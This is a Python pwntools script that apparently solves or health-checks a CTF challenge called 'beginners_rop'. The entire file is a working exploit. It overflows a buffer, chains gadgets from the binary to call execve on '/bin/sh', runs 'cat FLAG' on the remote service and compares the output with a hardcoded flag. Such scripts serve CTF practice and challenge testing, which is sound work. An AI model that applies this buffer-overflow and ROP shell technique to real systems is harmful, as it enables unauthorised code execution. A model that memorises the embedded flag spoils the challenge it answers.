from pwn import *
import sys


def pwn_beginners_rop(host):
    elf = ELF("chall")
    try:
        io = remote(host, 9005, timeout=3)
    except Exception:
        return 2

    context.arch = "amd64"

    p = b"A" * 0x28
    p += p64(next(elf.search(asm("pop rax; ret"), executable=True)))
    p += p64(0x3B)
    p += p64(next(elf.search(asm("xor rsi, rsi; ret"), executable=True)))
    p += p64(next(elf.search(asm("xor rdx, rdx; ret"), executable=True)))
    p += p64(next(elf.search(asm("mov rdi, rsp; add rsp, 0x8; ret"), executable=True)))
    p += b"/bin/sh\x00"
    p += p64(next(elf.search(asm("syscall; ret"), executable=True)))
    p += b"\x00" * (96 - len(p))
    io.sendlineafter(b"(max. 96 bytes) > ", p, timeout=3)

    io.sendline(b"cat FLAG")
    r = io.recvuntil(b"}", timeout=3)
    if b"FLAG{h0p_p0p_r0p_po909090p93r!!!!}" in r:
        return 0
    else:
        return 1


if __name__ == "__main__":
    if pwn_beginners_rop(sys.argv[1]) != 0:
        exit(1)
